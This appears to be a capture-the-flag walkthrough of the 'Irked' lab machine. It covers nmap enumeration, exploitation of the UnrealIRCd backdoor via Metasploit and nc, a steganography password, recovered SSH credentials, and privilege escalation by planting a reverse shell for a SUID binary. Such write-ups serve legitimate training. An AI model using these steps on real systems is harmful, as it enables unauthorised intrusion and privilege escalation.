# Irked

### Nmap

```
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey: 
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          32929/tcp6  status
|   100024  1          36346/udp   status
|   100024  1          42149/udp6  status
|_  100024  1          58466/tcp   status
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
58466/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd

nmap -T4 -sV --script=irc-botnet-channels,irc-info,irc-unrealircd-backdoor -p 6697,8067,65534 $IP

PORT      STATE SERVICE VERSION
6697/tcp  open  irc     UnrealIRCd (Admin email djmardov@irked.htb)
| irc-botnet-channels: 
|_  ERROR: Closing Link: [10.10.14.23] (Throttled: Reconnecting too fast) -Email djmardov@irked.htb for more information.
8067/tcp  open  irc     UnrealIRCd (Admin email djmardov@irked.htb)
| irc-botnet-channels: 
|_  ERROR: Closing Link: [10.10.14.23] (Throttled: Reconnecting too fast) -Email djmardov@irked.htb for more information.
65534/tcp open  irc     UnrealIRCd (Admin email djmardov@irked.htb)
| irc-botnet-channels: 
|_  ERROR: Closing Link: [10.10.14.23] (Throttled: Reconnecting too fast) -Email djmardov@irked.htb for more information.
```

### Web Enum

```

http://10.10.10.117/ -> IRC is almost working!

http://10.10.10.117/manual/ -> apache doc
```

### Exploitation & Priv Esc

```bash
# method 1
msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > exploit

# method 2
# Ref: https://datatracker.ietf.org/doc/html/rfc1459
nc -nv $IP 6697
(UNKNOWN) [10.10.10.117] 6697 (ircs-u) open
:irked.htb NOTICE AUTH :*** Looking up your hostname...
:irked.htb NOTICE AUTH :*** Couldn not resolve your hostname; using your IP address instead
NICK user
PASS user
USER test test test : user
:irked.htb 001 user :Welcome to the ROXnet IRC Network user!test@10.10.14.23
:irked.htb 002 user :Your host is irked.htb, running version Unreal3.2.8.1

# call reverse shell

# PE
# /home/djmardov/Documents/.backup
Super elite steg backup pw
UPupDOWNdownLRlrBAbaSSss

# get image on the website
wget 10.10.10.117/irked.jpg

# extract password from image
steghide extract -sf irked.jpg -p UPupDOWNdownLRlrBAbaSSss

# login djmardov:Kab6h+m+bbp2J:HG
ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" djmardov@$IP

# sus SUID
/usr/bin/viewuser

# found viewuser will run /tmp/listuser
# put nc reverse to /tmp/listuser
# get shell
```
